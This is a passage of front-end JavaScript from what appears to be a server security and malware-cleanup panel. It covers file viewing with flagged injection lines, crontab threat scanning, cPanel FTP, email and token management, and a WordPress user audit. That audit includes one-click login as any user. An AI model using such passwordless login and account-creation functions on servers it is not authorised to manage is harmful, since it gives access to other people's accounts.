                this.selectionStart = this.selectionEnd = s + 4;
            }
            if (e.ctrlKey && e.key === 's') { e.preventDefault(); saveFile(); }
        });
        function jumpToEditorLine(lineNum) {
            var ta = document.getElementById('fe-body');
            var lines = ta.value.split('\n');
            var pos = 0;
            for (var i = 0; i < Math.min(lineNum - 1, lines.length); i++) pos += lines[i].length + 1;
            var lineLen = (lines[lineNum - 1] || '').length;
            ta.focus();
            ta.setSelectionRange(pos, pos + lineLen);
            var lineHeight = parseInt(window.getComputedStyle(ta).lineHeight) || 22;
            ta.scrollTop = Math.max(0, (lineNum - 5)) * lineHeight;
        }
        function buildUrl(domain, path) {
            var rel = null;
            // XAMPP: G:/xampp/htdocs/folder/file → localhost/folder/file
            var xm = path.match(/[A-Z]:.*htdocs\/(.+)$/i);
            if (xm) return window.location.origin + '/' + xm[1];
            // Standard patterns (order matters — most specific first)
            var patterns = [
                /public_html\/(.+)$/,
                /\/var\/www\/html\/(.+)$/,
                /\/public\/(.+)$/,
                /\/www\/(.+)$/,
                /\/httpdocs\/(.+)$/,
                /\/web\/(.+)$/,
                /htdocs\/(.+)$/,
                /\/html\/(.+)$/,
                /\/home\/[^\/]+\/(.+)$/,
            ];
            for (var i = 0; i < patterns.length; i++) {
                var m = path.match(patterns[i]);
                if (m) { rel = m[1]; break; }
            }
            // Fallback: use filename from wp-content onward
            if (!rel) {
                var wpIdx = path.indexOf('/wp-content/');
                if (wpIdx !== -1) rel = path.substring(wpIdx + 1);
                else {
                    var lastSlash = path.lastIndexOf('/');
                    rel = lastSlash !== -1 ? path.substring(lastSlash + 1) : path;
                }
            }
            var host = domain;
            if (!host || host === 'main' || host.indexOf('.') === -1) {
                var dm = path.match(/\/domains\/([^\/]+)\//);
                host = dm ? dm[1] : window.location.hostname;
            }
            var proto = (host === 'localhost' || host === '127.0.0.1') ? 'http://' : 'https://';
            return proto + host + '/' + rel;
        }
        function pathToDomain(path) {
            var m = path.match(/\/domains\/([^\/]+)\//);
            if (m) return m[1];
            if (path.match(/public_html|htdocs|\/var\/www\/html|\/public\/|\/www\/|\/httpdocs\//)) return window.location.hostname;
            return null;
        }
        var _viewAfterFn = null;
        function viewFile(path, afterFn) {
            _viewAfterFn = afterFn || null;
            var ov = document.getElementById('fv-overlay');
            document.getElementById('fv-body').textContent = 'Loading...';
            document.getElementById('fv-title').textContent = path.split('/').pop();
            document.getElementById('fv-path').textContent = path;
            document.getElementById('fv-meta').textContent = '';
            ov.style.display = 'flex';
            var delBtn = document.getElementById('fv-del');
            delBtn.onclick = function () {
                if (confirm('Delete this file?\n\n' + path)) {
                    api('remove_file', { path: path }, function (d) {
                        log(d.ok ? 'Deleted: ' + path : 'Failed to delete: ' + path);
                        closeViewer();
                        if (_viewAfterFn) _viewAfterFn();
                    });
                }
            };
            var editBtn = document.getElementById('fv-edit');
            editBtn.onclick = function () { closeViewer(); editFile(path, _viewAfterFn); };
            var renameBtn = document.getElementById('fv-rename');
            renameBtn.onclick = function () {
                var fname = path.split('/').pop();
                var newName = prompt('Rename file:\n\n' + fname, fname);
                if (!newName || newName === fname) return;
                api('rename_file', { path: path, new_name: newName }, function (d) {
                    if (d.ok === false) { alert(d.error || 'Rename failed'); return; }
                    log('Renamed: ' + fname + ' → ' + newName);
                    closeViewer();
                    if (_viewAfterFn) _viewAfterFn();
                });
            };
            var _viewRetried = false;
            function _loadView() {
            api('read_file', { path: path }, function (d) {
                if (d.ok === false) {
                    document.getElementById('fv-body').textContent = '⚠ ' + (d.error || 'Cannot read file');
                    document.getElementById('fv-body').style.color = 'var(--accent)';
                    return;
                }
                document.getElementById('fv-body').style.color = 'var(--t1)';
                document.getElementById('fv-meta').textContent = Math.round(d.size / 1024 * 10) / 10 + ' KB  |  ' + (d.mod || '');
                // Build view with line numbers + highlight suspicious lines
                var sl = d.suspicious_lines || [];
                var suspLineNums = {};
                sl.forEach(function (s) { suspLineNums[s.line] = s.pattern; });
                var fvBody = document.getElementById('fv-body');
                fvBody.textContent = '';
                if (sl.length > 0) {
                    var wx2 = E('div');
                    wx2.style.cssText = 'background:#ff453a11;border:1px solid #ff453a33;border-radius:6px;padding:7px 10px;margin-bottom:10px';
                    var wt2 = E('span'); wt2.style.cssText = 'color:var(--accent);font-weight:600;font-size:11px';
                    wt2.textContent = '⚠ Injection detected at line(s): ';
                    wx2.appendChild(wt2);
                    sl.forEach(function (s, i) {
                        var lk = E('span');
                        lk.style.cssText = 'color:var(--accent);font-family:monospace;font-weight:700;cursor:pointer;margin-right:8px;text-decoration:underline';
                        lk.textContent = s.line + ' [' + s.pattern + ']';
                        lk.title = s.snippet;
                        lk.onclick = (function (lineId) {
                            return function () {
                                var el = document.getElementById('fvl-' + lineId);
                                if (el) el.scrollIntoView({ behavior: 'smooth', block: 'center' });
                            };
                        })(s.line);
                        wx2.appendChild(lk);
                    });
                    fvBody.appendChild(wx2);
                }
                var lines = (d.content || '(empty)').split('\n');
                lines.forEach(function (line, idx) {
                    var lineNum = idx + 1;
                    var row = E('div'); row.id = 'fvl-' + lineNum;
                    row.style.cssText = 'display:flex;' + (suspLineNums[lineNum] ? 'background:#ff453a1a;border-left:3px solid var(--accent);' : 'border-left:3px solid transparent;');
                    var lnSpan = E('span');
                    lnSpan.style.cssText = 'min-width:42px;color:var(--t3);font-size:11px;padding:0 10px 0 4px;user-select:none;text-align:right;flex-shrink:0';
                    lnSpan.textContent = lineNum;
                    if (suspLineNums[lineNum]) { lnSpan.style.color = 'var(--accent)'; lnSpan.style.fontWeight = '700'; lnSpan.title = suspLineNums[lineNum]; }
                    var codeSpan = E('span');
                    codeSpan.style.cssText = 'white-space:pre-wrap;word-break:break-all;' + (suspLineNums[lineNum] ? 'color:#ffb3b3;' : '');
                    codeSpan.textContent = line;
                    row.appendChild(lnSpan); row.appendChild(codeSpan);
                    fvBody.appendChild(row);
                });
                if (sl.length > 0) {
                    var firstEl = document.getElementById('fvl-' + sl[0].line);
                    if (firstEl) setTimeout(function () { firstEl.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 150);
                }
                log('Viewing: ' + path + (sl.length ? ' ⚠ injection at line(s) ' + sl.map(function (s) { return s.line }).join(', ') : ' ✔ clean'));
            }, function () {
                if (!_viewRetried) { _viewRetried = true; document.getElementById('fv-body').textContent = 'Retrying...'; setTimeout(_loadView, 500); }
                else { document.getElementById('fv-body').textContent = '⚠ Failed to load file (timeout). Close and try again.'; document.getElementById('fv-body').style.color = 'var(--accent)'; }
            });
            }
            _loadView();
        }
        function closeViewer() {
            document.getElementById('fv-overlay').style.display = 'none';
            document.getElementById('fv-body').textContent = '';
        }
        document.getElementById('fv-overlay').addEventListener('click', function (e) {
            if (e.target === this) closeViewer();
        });
        // ── ESC KEY — close any open overlay/modal ──
        document.addEventListener('keydown', function (e) {
            if (e.key !== 'Escape') return;
            var fv = document.getElementById('fv-overlay');
            if (fv && fv.style.display !== 'none' && fv.style.display !== '') { closeViewer(); return; }
            var fe = document.getElementById('fe-overlay');
            if (fe && fe.style.display !== 'none' && fe.style.display !== '') { closeEditor(); return; }
            var sm = document.getElementById('ssh-edit-modal');
            if (sm && sm.style.display !== 'none' && sm.style.display !== '') { sshEditClose(); return; }
        });
        // ── EXEC CAPABILITY CHECK ─────────────────────────────────────────
        function checkExecCaps(targetEl) {
            api('exec_caps', {}, function (d) {
                if (!targetEl) return;
                var el = document.getElementById(targetEl);
                if (!el) return;
                if (!d.exec_works) {
                    el.innerHTML = '<div style="background:#ff9f0a1a;border:1px solid #ff9f0a44;border-radius:8px;padding:10px 14px;font-size:11px">'
                        + '<span style="color:var(--orange);font-weight:600">⚠ exec() disabled on this server</span><br>'
                        + '<span style="color:var(--t3)">Available: ' + (d.available.join(', ') || 'none') + '</span><br>'
                        + '<span style="color:var(--t3)">PHP native (read/write/delete/scan): '
                        + (d.php_read ? '<span style="color:var(--green)">✔ works</span>' : '✘') + '</span><br>'
                        + '<span style="color:var(--t3)">disabled_functions: <code style="color:var(--orange);font-size:10px">' + d.disabled_fns + '</code></span>'
                        + '</div>';
                    log('⚠ exec disabled — ' + d.note);
                } else {
                    el.innerHTML = '<div style="background:#32d74b1a;border:1px solid #32d74b33;border-radius:6px;padding:6px 12px;font-size:11px;color:var(--green)">✔ Shell exec available — full scan/kill capability</div>';
                }
            });
        }
        // ── CRONTAB GUARD ─────────────────────────────────────────────────
        function sCron() {
            checkExecCaps('cron-caps');
            document.getElementById('cron-raw').textContent = 'Loading...';
            document.getElementById('cron-status').textContent = '';
            document.getElementById('btn-clean-cron').style.display = 'none';
            api('scan_crontab', {}, function (d) {
                // Raw output with highlighting
                var rawEl = document.getElementById('cron-raw');
                rawEl.textContent = '';
                var malLines = {};
                (d.malicious || []).forEach(function (m) { malLines[m.line] = m.pattern; });
                var lines = (d.raw || '').split('\n');
                lines.forEach(function (line, idx) {
                    var row = E('div');
                    var lineNum = idx + 1;
                    if (malLines[lineNum]) {
                        row.style.cssText = 'background:#ff453a1a;border-left:3px solid var(--accent);padding:0 8px;color:#ffb3b3';
                        row.title = 'SUSPICIOUS: ' + malLines[lineNum];
                    } else {
                        row.style.cssText = 'padding:0 8px;border-left:3px solid transparent';
                    }
                    row.textContent = line;
                    rawEl.appendChild(row);
                });
                // Status
                var stEl = document.getElementById('cron-status');
                if (d.threat_count > 0) {
                    stEl.innerHTML = '<div style="background:#ff453a1a;border:1px solid #ff453a33;border-radius:8px;padding:10px 14px">'
                        + '<span style="color:var(--accent);font-weight:600">⚠ ' + d.threat_count + ' malicious crontab entry detected:</span><br><br>'
                        + (d.malicious || []).map(function (m) { return '<code style="color:#ffb3b3;font-size:11px;display:block;margin:2px 0">Line ' + m.line + ' [' + m.pattern + ']: ' + m.content.substring(0, 120) + '</code>'; }).join('')
                        + '</div>';
                    document.getElementById('btn-clean-cron').style.display = 'inline-flex';
                    var crb = document.getElementById('crb');
                    if (crb) { crb.textContent = d.threat_count; crb.classList.remove('hid'); }
                } else {
                    stEl.innerHTML = '<div style="background:#32d74b1a;border:1px solid #32d74b33;border-radius:8px;padding:10px 14px;color:var(--green);font-weight:600">✔ Crontab clean — no malicious entries</div>';
                    var crb = document.getElementById('crb');
                    if (crb) crb.classList.add('hid');
                }
                log('Crontab: ' + d.threat_count + ' threat(s) in ' + d.total_lines + ' lines');
            });
        }
        function cleanCron() {
            api('clean_crontab', {}, function (d) {
                if (d.ok) {
                    log('✔ Crontab cleaned — removed ' + d.removed + ' line(s), method: ' + d.method);
                    if (d.warning) log('⚠ ' + d.warning);
                } else {
                    log('✘ Crontab was not changed — ' + (d.warning || 'no usable write method'));
                    alert('Crontab was not changed. ' + (d.warning || 'The hosting provider must remove the entries.'));
                }
                sCron();
            });
        }
        // ─────────────────────────────────────────────────────────────────
        // ── CPANEL FTP ─────────────────────────────────────────────────
        var _cpUser = '', _cpToken = '';
        function _getCpCreds() {
            var u = document.getElementById('cp-user').value.trim();
            var t = document.getElementById('cp-token').value.trim();
            if (u) _cpUser = u;
            if (t) _cpToken = t;
            return { user: _cpUser, token: _cpToken };
        }
        function cpLoad() {
            document.getElementById('cp-status').textContent = 'Loading...';
            document.getElementById('cp-ftp-tbody').innerHTML = '<tr><td colspan="6" class="ld pu">Scanning...</td></tr>';
            document.getElementById('cp-email-tbody').innerHTML = '<tr><td colspan="4" class="ld pu">Scanning...</td></tr>';
            var creds = _getCpCreds();
            var cpUser = creds.user, cpToken = creds.token;
            api('cpanel_ftp_list', { cp_user: cpUser, cp_token: cpToken }, function (d) {
                if (d.cpanel === false) {
                    document.getElementById('cp-status').innerHTML = '<span style="color:var(--orange)">&#9888; cPanel not detected on this server (no UAPI)</span>';
                    document.getElementById('cp-ftp-tbody').innerHTML = '<tr><td colspan="6" style="text-align:center;padding:16px;color:var(--t3)">Not a cPanel server</td></tr>';
                    document.getElementById('cp-email-tbody').innerHTML = '<tr><td colspan="4" style="text-align:center;padding:16px;color:var(--t3)">Not a cPanel server</td></tr>';
                    return;
                }
                var methodTag = d.method === 'uapi_cli' ? '<span style="color:var(--g);font-size:10px;border:1px solid var(--g);padding:1px 6px;border-radius:4px;margin-left:6px">UAPI</span>' : '<span style="color:var(--orange);font-size:10px;border:1px solid var(--orange);padding:1px 6px;border-radius:4px;margin-left:6px">FALLBACK</span>';
                document.getElementById('cp-status').innerHTML = '<span style="color:var(--g)">cPanel detected</span>' + methodTag + ' &mdash; Main user: <b style="color:var(--t1)">' + (d.main_user || '?') + '</b> &mdash; ' + d.total + ' FTP &mdash; ' + d.email_count + ' Email &mdash; ' + d.db_user_count + ' DB users';
                // FTP
                var ftb = document.getElementById('cp-ftp-tbody'); ftb.innerHTML = '';
                if (d.accounts.length === 0) { ftb.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:16px;color:var(--g)">&#10004; No FTP accounts (clean)</td></tr>'; }
                else d.accounts.forEach(function (a) {
                    var tr = E('tr');
                    var tds = [a.user, a.login, a.dir, (a.disk_used || '0') + '%', a.quota];
                    tds.forEach(function (v, i) {
                        var td = E('td'); td.textContent = v; td.style.fontSize = '11px';
                        if (i === 2) { td.style.fontFamily = 'monospace'; td.style.fontSize = '10px'; }
                        tr.appendChild(td);
                    });
                    var tdA = E('td');
                    var db = E('button'); db.className = 'btn btn-s btn-d'; db.style.cssText = 'font-size:10px;padding:2px 8px'; db.textContent = '🗑 Delete';
                    db.onclick = (function (u) { return function () { if (confirm('Delete FTP account: ' + u + '?\n\nThis removes the FTP login but NOT the files.')) { api('cpanel_ftp_delete', { ftp_user: u }, function (d2) { if (d2.ok === false) alert(d2.error); else cpLoad(); }); } }; })(a.user);
                    tdA.appendChild(db);
                    tr.appendChild(tdA);
                    ftb.appendChild(tr);
                });
                // Email
                var etb = document.getElementById('cp-email-tbody'); etb.innerHTML = '';
                if (d.emails.length === 0) { etb.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:16px;color:var(--g)">&#10004; No email accounts</td></tr>'; }
                else d.emails.forEach(function (em) {
                    var tr = E('tr');
                    [em.email, em.domain, em.disk_used].forEach(function (v) { var td = E('td'); td.textContent = v; td.style.fontSize = '11px'; tr.appendChild(td); });
                    var tdA = E('td');
                    var db = E('button'); db.className = 'btn btn-s btn-d'; db.style.cssText = 'font-size:10px;padding:2px 8px'; db.textContent = '🗑 Delete';
                    db.onclick = (function (e) { return function () { if (confirm('Delete email account: ' + e + '?')) { api('cpanel_email_delete', { email: e }, function (d2) { if (d2.ok === false) alert(d2.error); else cpLoad(); }); } }; })(em.email);
                    tdA.appendChild(db);
                    tr.appendChild(tdA);
                    etb.appendChild(tr);
                });
                // DB Users
                var dbDiv = document.getElementById('cp-db-list'); dbDiv.innerHTML = '';
                if (d.db_users.length === 0) { dbDiv.textContent = 'No MySQL users found'; }
                else {
                    d.db_users.forEach(function (u) {
                        var sp = E('span'); sp.style.cssText = 'display:inline-block;padding:2px 8px;margin:2px;border-radius:4px;background:var(--bg3);border:1px solid var(--b2);font-family:monospace;font-size:11px;color:var(--t2)';
                        sp.textContent = typeof u === 'string' ? u : (u.user || JSON.stringify(u));
                        dbDiv.appendChild(sp);
                    });
                }
                // Databases (if UAPI curl mode returned them)
                if (d.databases && d.databases.length > 0) {
                    var dbLabel = E('div'); dbLabel.style.cssText = 'font-size:11px;color:var(--t3);margin-top:8px;font-weight:600'; dbLabel.textContent = 'Databases (' + d.databases.length + '):'; dbDiv.appendChild(dbLabel);
                    d.databases.forEach(function (db) {
                        var sp = E('span'); sp.style.cssText = 'display:inline-block;padding:2px 8px;margin:2px;border-radius:4px;background:var(--bg3);border:1px solid var(--b2);font-family:monospace;font-size:11px;color:var(--orange)';
                        sp.textContent = typeof db === 'string' ? db : (db.database || db.db || JSON.stringify(db));
                        dbDiv.appendChild(sp);
                    });
                }
                // Subdomains
                if (d.subdomains && d.subdomains.length > 0) {
                    var subLabel = E('div'); subLabel.style.cssText = 'font-size:11px;color:var(--t3);margin-top:8px;font-weight:600'; subLabel.textContent = 'Subdomains (' + d.subdomains.length + '):'; dbDiv.appendChild(subLabel);
                    d.subdomains.forEach(function (s) {
                        var sp = E('span'); sp.style.cssText = 'display:inline-block;padding:2px 8px;margin:2px;border-radius:4px;background:var(--bg3);border:1px solid var(--b2);font-family:monospace;font-size:11px;color:var(--g)';
                        sp.textContent = typeof s === 'string' ? s : (s.domain || s.subdomain || JSON.stringify(s));
                        dbDiv.appendChild(sp);
                    });
                }
                // Show/hide credentials based on method
                var credsDiv = document.getElementById('cp-creds');
                if (d.needs_credentials) {
                    credsDiv.style.display = 'flex';
                } else {
                    credsDiv.style.display = 'none';
                }
                if (d.uapi_error) {
                    var errDiv = E('div'); errDiv.style.cssText = 'background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:8px;padding:10px;margin:0 12px 12px;font-size:11px;color:var(--r)';
                    errDiv.textContent = 'UAPI Error: ' + d.uapi_error;
                    document.getElementById('cp-status').after(errDiv);
                }
                // Auto-load API Tokens after successful scan
                cpTokenList();
            });
        }
        function cpTokenList() {
            var creds = _getCpCreds();
            var cpUser = creds.user, cpToken = creds.token;
            var tb = document.getElementById('cp-token-tbody');
            tb.innerHTML = '<tr><td colspan="4" class="ld pu">Loading tokens...</td></tr>';
            api('cpanel_tokens_list', { cp_user: cpUser, cp_token: cpToken }, function (d) {
                tb.innerHTML = '';
                if (d.ok === false) { tb.innerHTML = '<tr><td colspan="4" style="color:var(--r);padding:12px">' + (d.error || 'Error') + '</td></tr>'; return; }
                if (!d.tokens || d.tokens.length === 0) {
                    tb.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:16px;color:var(--t3)">No API tokens found' + (d.raw_hint ? '<br><span style="font-size:10px">' + d.raw_hint + '</span>' : '') + '</td></tr>';
                    return;
                }
                d.tokens.forEach(function (t) {
                    var tr = E('tr');
                    // Name + details
                    var tdN = E('td');
                    var nameDiv = E('div'); nameDiv.style.cssText = 'font-weight:600;font-family:monospace;font-size:12px;color:var(--t1)'; nameDiv.textContent = t.name; tdN.appendChild(nameDiv);
                    var detailDiv = E('div'); detailDiv.style.cssText = 'font-size:10px;color:var(--t3);margin-top:2px';
                    detailDiv.textContent = 'User: ' + (cpUser || d.method || '?');
                    if (t.restrictions && t.restrictions.length > 0) detailDiv.textContent += ' | Restrictions: ' + t.restrictions.join(', ');
                    tdN.appendChild(detailDiv);
                    tr.appendChild(tdN);
                    // Created
                    var tdC = E('td'); tdC.style.cssText = 'font-size:11px;color:var(--t3)'; tdC.textContent = t.created; tr.appendChild(tdC);
                    // Access
                    var tdA = E('td');
                    var badge = E('span');
                    if (t.has_full_access) { badge.style.cssText = 'padding:2px 8px;border-radius:4px;font-size:10px;font-weight:600;background:rgba(239,68,68,0.2);color:var(--r)'; badge.textContent = 'FULL ACCESS'; }
                    else { badge.style.cssText = 'padding:2px 8px;border-radius:4px;font-size:10px;font-weight:600;background:rgba(255,159,10,0.2);color:var(--orange)'; badge.textContent = 'RESTRICTED'; }
                    tdA.appendChild(badge);
                    tr.appendChild(tdA);
                    // Actions
                    var tdAc = E('td'); tdAc.style.cssText = 'display:flex;gap:4px';
                    var rb = E('button'); rb.className = 'btn btn-s btn-d'; rb.style.cssText = 'font-size:10px;padding:2px 8px'; rb.textContent = 'Revoke';
                    rb.onclick = (function (name, row) {
                        return function () {
                            if (!confirm('Revoke API token "' + name + '"?\n\nAnyone using this token will lose access immediately.')) return;
                            api('cpanel_token_revoke', { cp_user: cpUser, cp_token: cpToken, token_name: name }, function (d2) {
                                if (d2.ok === false) { alert(d2.error); return; }
                                row.style.background = 'rgba(239,68,68,0.08)';
                                row.querySelector('button').remove();
                                var revBadge = E('span'); revBadge.style.cssText = 'padding:2px 8px;border-radius:4px;font-size:10px;font-weight:600;background:rgba(239,68,68,0.3);color:var(--r)'; revBadge.textContent = 'REVOKED';
                                row.lastChild.appendChild(revBadge);
                                row.querySelector('div').style.textDecoration = 'line-through';
                            });
                        };
                    })(t.name, tr);
                    tdAc.appendChild(rb);
                    tr.appendChild(tdAc);
                    tb.appendChild(tr);
                });
                // Create new token row
                var addRow = E('tr'); addRow.style.background = 'rgba(255,255,255,0.02)';
                var addTd = E('td'); addTd.colSpan = 4; addTd.style.cssText = 'padding:8px 10px;display:flex;gap:8px;align-items:center';
                var inp = E('input'); inp.type = 'text'; inp.id = 'cp-new-token-name'; inp.placeholder = 'New token name'; inp.style.cssText = 'width:200px;background:var(--bg0);border:1px solid var(--border);border-radius:6px;color:var(--t1);padding:4px 8px;font-size:11px';
                var btn = E('button'); btn.className = 'btn btn-s btn-ok'; btn.style.cssText = 'font-size:10px;padding:3px 10px'; btn.textContent = '+ Create Token';
                btn.onclick = function () {
                    var name = document.getElementById('cp-new-token-name').value.trim();
                    if (!name) { alert('Token name required'); return; }
                    api('cpanel_token_create', { cp_user: cpUser, cp_token: cpToken, token_name: name }, function (d2) {
                        if (d2.ok === false) { alert(d2.error); return; }
                        var val = typeof d2.token_value === 'string' ? d2.token_value : JSON.stringify(d2.token_value);
                        prompt('Token created! Copy this value (shown only once):', val);
                        cpTokenList();
                    });
                };
                addTd.appendChild(inp); addTd.appendChild(btn);
                addRow.appendChild(addTd); tb.appendChild(addRow);
            });
        }
        function cpFtpAdd() {
            var u = document.getElementById('cp-ftp-user').value.trim();
            var p = document.getElementById('cp-ftp-pass').value.trim();
            var d = document.getElementById('cp-ftp-dir').value.trim();
            var q = document.getElementById('cp-ftp-quota').value.trim();
            if (!u || !p) { alert('Username and password required'); return; }
            api('cpanel_ftp_add', { ftp_user: u, ftp_pass: p, ftp_dir: d, ftp_quota: q }, function (r) {
                if (r.ok === false) { alert(r.error); return; }
                alert('FTP account created: ' + r.created);
                document.getElementById('cp-ftp-user').value = '';
                document.getElementById('cp-ftp-pass').value = '';
                cpLoad();
            });
        }

        function sWpDb() {
            log('WP Database audit...');
            api('scan_wp_db', {}, function (d) {
                if (!d.wp_found) { log('⚠ WordPress not found — skipping DB audit'); return; }
                d.domains.forEach(function (dom) {
                    if (dom.error) { log('⚠ ' + dom.domain + ': ' + dom.error); return; }
                    var threats = dom.threats || [];
                    log('WP DB [' + dom.domain + ']: ' + dom.total_users + ' users, ' + dom.admin_count + ' admins, ' + dom.app_password_count + ' app passwords');
                    if (threats.length === 0) { log('  ✔ No database threats found'); return; }
                    threats.forEach(function (t) {
                        var icon = t.severity === 'critical' ? '🔴' : (t.severity === 'high' ? '🟠' : '🟡');
                        log('  ' + icon + ' [' + t.type + '] ' + t.detail);
                    });
                    log('  ▸ default_role: ' + (dom.default_role || '?') + ' | users_can_register: ' + (dom.users_can_register || '?'));
                    document.getElementById('dv-s').textContent = (parseInt(document.getElementById('dv-s').textContent) || 0) + threats.length;
                });
            });
        }
        // ── WP USERS ──────────────────────────────────────────────────────
        var wpPage = 1;
        function wpLoadUsers(page) {
            if (page < 1) return;
            wpPage = page;
            var role = document.getElementById('wp-role').value;
            var tb = document.getElementById('wp-tbody');
            tb.innerHTML = '<tr><td colspan="9" class="ld pu">Loading...</td></tr>';
            api('wp_list_users', { page: page, per_page: 20, role: role }, function (d) {
                if (d.ok === false) { tb.innerHTML = '<tr><td colspan="9" class="ld" style="color:var(--r)">' + (d.error || 'Error') + '</td></tr>'; return; }
                if (d.total_pages && page > d.total_pages) { wpLoadUsers(d.total_pages); return; }
                // Stats
                var stats = document.getElementById('wp-stats');
                stats.innerHTML = '<span>Total Users: <b style="color:var(--t1)">' + (d.total_all_users || 0).toLocaleString() + '</b></span>'
                    + '<span>Admins: <b style="color:var(--orange)">' + (d.admin_count || 0) + '</b></span>'
                    + '<span>App Passwords: <b style="color:' + (d.app_pwd_total > 10 ? 'var(--r)' : 'var(--t1)') + '">' + (d.app_pwd_total || 0).toLocaleString() + '</b></span>'
                    + '<span>Default Role: <b style="color:' + (d.default_role === 'administrator' ? 'var(--r)' : 'var(--g)') + '">' + (d.default_role || '?') + '</b></span>'
                    + '<span>Registration: <b>' + (d.users_can_register === '1' ? 'OPEN' : 'Closed') + '</b></span>';
                // Threats
                var tDiv = document.getElementById('wp-threats');
                tDiv.innerHTML = '';
                if (d.duplicates && d.duplicates.length > 0) {
                    d.duplicates.forEach(function (dup) {
                        var w = E('div'); w.style.cssText = 'background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.2);border-radius:8px;padding:8px 12px;margin-bottom:6px;font-size:12px';
                        w.innerHTML = '<span style="color:var(--r)">&#9888; Duplicate username:</span> <b>' + dup.user_login + '</b> × ' + dup.cnt + ' accounts';
                        tDiv.appendChild(w);
                    });
                }
                if (d.app_pwd_total > 10) {
                    var w = E('div'); w.style.cssText = 'background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.2);border-radius:8px;padding:8px 12px;margin-bottom:6px;font-size:12px';
                    w.innerHTML = '<span style="color:var(--r)">&#9888; Mass Application Passwords:</span> ' + d.app_pwd_total + ' users have app passwords (possible API abuse)';
                    tDiv.appendChild(w);
                }
                // Pager
                document.getElementById('wp-pager').textContent = 'Page ' + d.page + '/' + d.total_pages + ' (' + d.total + ' users)';
                // Table
                tb.innerHTML = '';
                if (!d.users || d.users.length === 0) { tb.innerHTML = '<tr><td colspan="9" style="text-align:center;padding:20px;color:var(--t3)">No users found</td></tr>'; return; }
                d.users.forEach(function (u) {
                    var tr = E('tr');
                    if (u.flags.length > 0) tr.style.background = 'rgba(239,68,68,0.05)';
                    // Checkbox
                    var tdCb = E('td'); var cb = document.createElement('input'); cb.type = 'checkbox'; cb.className = 'wp-cb'; cb.value = u.id;
                    if (u.id === 1) { cb.disabled = true; cb.title = 'Cannot delete original admin'; }
                    cb.onchange = wpUpdateSelCount; tdCb.appendChild(cb); tr.appendChild(tdCb);
                    // ID
                    var tdId = E('td'); tdId.textContent = u.id; tdId.style.fontFamily = 'monospace'; tr.appendChild(tdId);
                    // Username
                    var tdU = E('td'); tdU.textContent = u.login; tdU.style.fontWeight = '600'; tr.appendChild(tdU);
                    // Email
                    var tdE = E('td'); tdE.textContent = u.email; tdE.style.fontSize = '11px'; tr.appendChild(tdE);
                    // Registered
                    var tdR = E('td'); tdR.textContent = u.registered; tdR.style.fontSize = '11px'; tdR.style.color = 'var(--t3)'; tr.appendChild(tdR);
                    // Roles
                    var tdRo = E('td'); tdRo.style.fontSize = '10px';
                    (u.roles || []).forEach(function (role) {
                        var sp = E('span'); sp.className = 'tag ' + (role === 'administrator' ? 'tag-d' : 'tag-y'); sp.textContent = role; sp.style.marginRight = '2px'; tdRo.appendChild(sp);
                    }); tr.appendChild(tdRo);
                    // App Passwords
                    var tdAp = E('td'); tdAp.textContent = u.app_passwords || 0; tdAp.style.textAlign = 'center';
                    if (u.app_passwords > 0) tdAp.style.color = 'var(--orange)'; tr.appendChild(tdAp);
                    // Flags
                    var tdF = E('td'); tdF.style.fontSize = '10px';
                    (u.flags || []).forEach(function (f) {
                        var sp = E('span'); sp.style.cssText = 'display:inline-block;padding:1px 6px;border-radius:4px;margin-right:2px;font-size:9px;font-weight:600;';
                        if (f === 'duplicate') { sp.style.background = 'rgba(239,68,68,0.2)'; sp.style.color = 'var(--r)'; sp.textContent = 'DUPE'; }
                        else if (f === 'hidden') { sp.style.background = 'rgba(239,68,68,0.2)'; sp.style.color = 'var(--r)'; sp.textContent = 'HIDDEN'; }
                        else if (f === 'recent') { sp.style.background = 'rgba(255,159,10,0.2)'; sp.style.color = 'var(--orange)'; sp.textContent = 'NEW'; }
                        tdF.appendChild(sp);
                    }); tr.appendChild(tdF);
                    // Actions
                    var tdA = E('td'); tdA.style.cssText = 'display:flex;gap:3px';
                    var lb = E('button'); lb.className = 'btn btn-s btn-ok'; lb.style.cssText = 'font-size:10px;padding:2px 8px'; lb.textContent = '🔑 Login';
                    lb.onclick = (function (uid, uname) { return function () { api('wp_auto_login', { user_id: uid }, function (d) { if (d.ok === false) { alert(d.error); return; } window.open(d.url, '_blank'); }); }; })(u.id, u.login);
                    tdA.appendChild(lb);
                    if (u.id > 1) {
                        var db = E('button'); db.className = 'btn btn-s btn-d'; db.style.cssText = 'font-size:10px;padding:2px 8px'; db.textContent = '🗑';
                        db.onclick = (function (uid, uname) { return function () { if (confirm('Delete user ' + uname + ' (ID ' + uid + ')?')) { api('wp_delete_users', { user_ids: JSON.stringify([uid]) }, function () { wpLoadUsers(wpPage); }); } }; })(u.id, u.login);
                        tdA.appendChild(db);
                    }
                    tr.appendChild(tdA);
                    tb.appendChild(tr);
                });
                document.getElementById('wp-selall').checked = false;
                document.getElementById('wp-del-sel').style.display = 'none';
                document.getElementById('wp-sel-count').style.display = 'none';
            });
        }
        function wpToggleAll(el) {
            document.querySelectorAll('.wp-cb:not(:disabled)').forEach(function (cb) { cb.checked = el.checked; });
            wpUpdateSelCount();
        }
        function wpUpdateSelCount() {
            var checked = document.querySelectorAll('.wp-cb:checked');
            var n = checked.length;
            document.getElementById('wp-del-sel').style.display = n > 0 ? '' : 'none';
            document.getElementById('wp-sel-count').style.display = n > 0 ? '' : 'none';
            document.getElementById('wp-sel-count').textContent = n + ' selected';
        }
        function wpDeleteSelected() {
            var ids = [];
            document.querySelectorAll('.wp-cb:checked').forEach(function (cb) { ids.push(parseInt(cb.value)); });
            if (ids.length === 0) return;
            if (!confirm('Delete ' + ids.length + ' user(s)?\n\nIDs: ' + ids.slice(0, 20).join(', ') + (ids.length > 20 ? '... (+' + (ids.length - 20) + ' more)' : '') + '\n\nThis cannot be undone!')) return;
            api('wp_delete_users', { user_ids: JSON.stringify(ids) }, function (d) {
                alert('Deleted: ' + d.deleted + '/' + d.requested);
                wpLoadUsers(wpPage);
            });
        }
        function wpAddUser() {
            var u = document.getElementById('wp-new-user').value.trim();
            var e = document.getElementById('wp-new-email').value.trim();
